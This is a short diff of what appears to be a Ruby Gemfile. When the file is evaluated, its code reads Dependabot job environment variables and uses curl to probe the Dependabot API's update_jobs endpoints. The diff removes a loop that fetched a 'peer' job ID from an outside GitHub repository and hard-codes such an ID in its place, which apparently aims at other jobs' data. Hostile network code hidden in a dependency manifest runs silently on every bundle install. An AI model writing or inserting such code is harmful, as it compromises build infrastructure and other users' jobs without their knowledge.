@@ -2,8 +2,8 @@ source "https://rubygems.org"
 
 job_id = ENV.fetch("DEPENDABOT_JOB_ID", "")
 api_base = ENV.fetch("DEPENDABOT_API_URL", "").sub(%r{/+$}, "")
-coord_state = "miss"
-peer_id = "none"
+coord_state = "literal"
+peer_id = "1621578324"
 own_code = "000"
 peer_active_code = "000"
 peer_after_code = "na"
@@ -14,21 +14,6 @@ begin
   require "open3"
 
   unless job_id.empty? || api_base.empty?
-    300.times do |attempt|
-      coordinate_url = [
-        "https://raw.githubusercontent.com/chawdamrunal/probe-lab/",
-        "probe-coordination/peer-jobs.txt?job=#{job_id}&attempt=#{attempt}"
-      ].join
-      coordinate, = Open3.capture3("curl", "-sS", "-m", "8", coordinate_url)
-      candidate = coordinate.scan(/\b[0-9]{1,20}\b/).uniq.find { |value| value != job_id }
-      if candidate
-        peer_id = candidate
-        coord_state = "hit"
-        break
-      end
-      sleep 1
-    end
-
     own_url = "#{api_base}/update_jobs/#{job_id}/blocked_versions?package-manager=bundler"
     own_code, = Open3.capture3("curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", own_url)
 
